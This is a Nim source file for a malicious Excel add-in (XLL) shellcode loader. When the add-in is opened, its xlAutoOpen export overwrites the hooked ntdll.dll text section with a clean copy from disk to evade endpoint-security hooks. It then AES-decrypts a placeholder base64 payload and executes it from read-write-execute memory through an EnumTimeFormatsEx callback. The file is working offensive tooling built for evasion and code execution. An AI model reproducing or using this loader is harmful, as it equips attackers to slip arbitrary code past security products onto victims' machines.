import nimcrypto
import base64
import winim
import winim/lean
import strutils
import ptr_math
import strformat


func toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

func toByteSeq(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))


#credit to offensive nim while i figure out a diff way to do this
proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true


proc shellcodeCallback(shellcode: openarray[byte]): void =

    let rPtr = VirtualAlloc(
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 


    
    EnumTimeFormatsEx(
        cast [TIMEFMT_ENUMPROCEX](rPtr),
        LOCALE_NAME_SYSTEM_DEFAULT,
        TIME_NOSECONDS,
        cast[LPARAM](nil)
    )


proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
   when isMainModule:
        let shellcode_base64_encrypted = "REPLACE_ME" #the easy way! replace me back if you need to remake your payload
        var result = ntdllunhook()  #so we need to assign it to a variable even though its not used. But if you discard it, it won't work... O_o
        var encodedIV: string = "t47unCor+GR9+cD+2d6FlQ==" #base64 encoded IV. hardcoded...fix this later
        var dctx: CTR[aes256]
        var enctext: seq[byte] = toByteSeq(decode(shellcode_base64_encrypted))
        var key: array[aes256.sizeKey, byte]
        var envkey: string = "PASSWORD_ME"
        var iv: array[aes256.sizeBlock, byte]
        var pp: string = decode(encodedIV)

        # Decode and save IV
        copyMem(addr iv[0], addr pp[0], len(pp))

        # Encrypt Key
        var expandedkey = sha256.digest(envkey)
        copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
        var dectext = newSeq[byte](len(enctext))

        # Decrypt
        dctx.init(key, iv)
        dctx.decrypt(enctext, dectext)
        dctx.clear()

        
        #fire!
        shellcodeCallback(dectext)

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()

  return true